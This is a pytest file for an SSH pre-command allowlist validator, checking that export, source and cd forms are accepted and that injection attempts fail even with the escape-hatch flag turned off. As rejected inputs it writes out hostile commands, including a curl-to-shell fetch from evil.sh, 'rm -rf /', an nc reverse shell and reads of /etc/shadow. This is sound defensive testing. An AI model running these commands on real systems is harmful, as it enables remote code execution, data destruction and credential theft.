"""Unit tests for the ssh_pre_commands allowlist (F-SEC-5)."""

from __future__ import annotations

from unittest.mock import patch

import pytest

from app.connectors import ssh_pre_commands as mod
from app.connectors.ssh_pre_commands import (
    PreCommandValidationError,
    validate_pre_commands,
)


class TestAllowedForms:
    def test_export_with_path_reference(self):
        cmds = ["export PATH=/opt/mysql/bin:$PATH"]
        assert validate_pre_commands(cmds) == cmds

    def test_bare_assignment(self):
        assert validate_pre_commands(["LANG=en_US.UTF-8"]) == ["LANG=en_US.UTF-8"]

    def test_source_and_dot(self):
        assert validate_pre_commands(["source /etc/profile"]) == ["source /etc/profile"]
        assert validate_pre_commands([". /home/user/.bashrc"]) == [". /home/user/.bashrc"]

    def test_cd(self):
        assert validate_pre_commands(["cd /var/lib/app"]) == ["cd /var/lib/app"]

    def test_quoted_value_with_spaces(self):
        cmds = ["export PGOPTIONS='-c statement_timeout=30s'"]
        assert validate_pre_commands(cmds) == cmds

    def test_empty_and_none(self):
        assert validate_pre_commands(None) == []
        assert validate_pre_commands([]) == []


class TestRejectedForms:
    @pytest.mark.parametrize(
        "cmd",
        [
            "rm -rf /",  # arbitrary binary
            "curl http://evil.sh | sh",  # pipe
            "export A=1; rm -rf /",  # chaining
            "export A=`whoami`",  # backtick substitution
            "export A=$(whoami)",  # $() substitution
            "cd /tmp && rm x",  # && chaining
            "export A=1 > /etc/passwd",  # redirect
            "source /etc/profile\nrm x",  # newline
        ],
    )
    def test_dangerous_commands_rejected(self, cmd):
        with pytest.raises(PreCommandValidationError):
            validate_pre_commands([cmd])

    def test_too_many_commands(self):
        cmds = [f"export V{i}=1" for i in range(mod.MAX_PRE_COMMANDS + 1)]
        with pytest.raises(PreCommandValidationError, match="Too many"):
            validate_pre_commands(cmds)

    def test_too_long_command(self):
        cmd = "export A=" + "x" * mod.MAX_PRE_COMMAND_LENGTH
        with pytest.raises(PreCommandValidationError, match="exceeds"):
            validate_pre_commands([cmd])

    def test_blank_command(self):
        with pytest.raises(PreCommandValidationError, match="non-empty"):
            validate_pre_commands(["   "])


class TestEscapeHatch:
    def test_disabled_allowlist_passes_anything(self):
        with patch.object(mod.settings, "ssh_pre_command_allowlist_enabled", False):
            assert validate_pre_commands(["rm -rf /"]) == ["rm -rf /"]

    def test_allowlist_enabled_by_default(self):
        from app.config import Settings

        assert Settings.model_fields["ssh_pre_command_allowlist_enabled"].default is True


# ---------------------------------------------------------------------------
# F-SSH-03: one switch, five protections
# ---------------------------------------------------------------------------


class TestKillSwitchIsNarrow:
    """`SSH_PRE_COMMAND_ALLOWLIST_ENABLED=false` returned the input untouched.

    Five separate protections sat behind that one flag: the count cap, the length cap,
    the non-empty-string check, the shell-metacharacter screen, and the command-shape
    allowlist. Only the last is *allowlist policy*. The flag is documented as an
    "emergency escape hatch" for an unusual bastion command — and an unusual command
    shape is a different request from command substitution.

    The flag defaults to on, so this was a foot-gun rather than a live hole. But a
    hatch that silently also disables the injection screen is one nobody can safely
    open, which makes the documented escape route unusable in practice.
    """

    @staticmethod
    def _off(monkeypatch):
        from app.config import settings

        monkeypatch.setattr(settings, "ssh_pre_command_allowlist_enabled", False)

    def test_an_unusual_shape_is_permitted_when_the_hatch_is_open(self, monkeypatch):
        """This is what the flag is for, and it still works."""
        self._off(monkeypatch)
        out = validate_pre_commands(["ulimit -n 4096"])
        assert out == ["ulimit -n 4096"]

    def test_command_substitution_is_still_refused(self, monkeypatch):
        self._off(monkeypatch)
        with pytest.raises(PreCommandValidationError) as exc:
            validate_pre_commands(["export X=$(cat /etc/shadow)"])
        assert "metacharacter" in str(exc.value).lower() or "$(" in str(exc.value)

    def test_chaining_is_still_refused(self, monkeypatch):
        self._off(monkeypatch)
        for hostile in ["cd /tmp; curl attacker", "cd /tmp && nc -e /bin/sh a 1", "cd /tmp | sh"]:
            with pytest.raises(PreCommandValidationError):
                validate_pre_commands([hostile])

    def test_a_backtick_is_still_refused(self, monkeypatch):
        self._off(monkeypatch)
        with pytest.raises(PreCommandValidationError):
            validate_pre_commands(["export X=`id`"])

    def test_a_newline_is_still_refused(self, monkeypatch):
        self._off(monkeypatch)
        with pytest.raises(PreCommandValidationError):
            validate_pre_commands(["cd /tmp\ncurl attacker"])

    def test_the_count_cap_still_applies(self, monkeypatch):
        """A cap on how many commands run is not allowlist policy."""
        self._off(monkeypatch)
        with pytest.raises(PreCommandValidationError) as exc:
            validate_pre_commands([f"X{i}=1" for i in range(mod.MAX_PRE_COMMANDS + 1)])
        assert "too many" in str(exc.value).lower()

    def test_the_length_cap_still_applies(self, monkeypatch):
        self._off(monkeypatch)
        with pytest.raises(PreCommandValidationError):
            validate_pre_commands(["X=" + "a" * (mod.MAX_PRE_COMMAND_LENGTH + 1)])

    def test_a_non_string_is_still_refused(self, monkeypatch):
        self._off(monkeypatch)
        with pytest.raises(PreCommandValidationError):
            validate_pre_commands([None])  # type: ignore[list-item]
        with pytest.raises(PreCommandValidationError):
            validate_pre_commands(["   "])

    def test_opening_the_hatch_is_logged_once_not_per_call(self, monkeypatch, caplog):
        """A warning on every query is noise that teaches people to ignore warnings;
        a warning that never fires leaves a disabled screen invisible forever."""
        import logging

        import app.connectors.ssh_pre_commands as mod

        self._off(monkeypatch)
        monkeypatch.setattr(mod, "_HATCH_WARNED", False, raising=False)
        with caplog.at_level(logging.WARNING, logger="app.connectors.ssh_pre_commands"):
            validate_pre_commands(["ulimit -n 4096"])
            validate_pre_commands(["ulimit -n 8192"])
        warnings = [r for r in caplog.records if r.levelno >= logging.WARNING]
        assert len(warnings) == 1, [r.getMessage() for r in warnings]
        assert "SSH_PRE_COMMAND_ALLOWLIST_ENABLED" in warnings[0].getMessage()

    def test_the_allowlist_on_path_is_unchanged(self):
        """The default remains: only export/source/cd shapes."""
        assert validate_pre_commands(["export PATH=/opt/bin:$PATH"])
        with pytest.raises(PreCommandValidationError):
            validate_pre_commands(["ulimit -n 4096"])
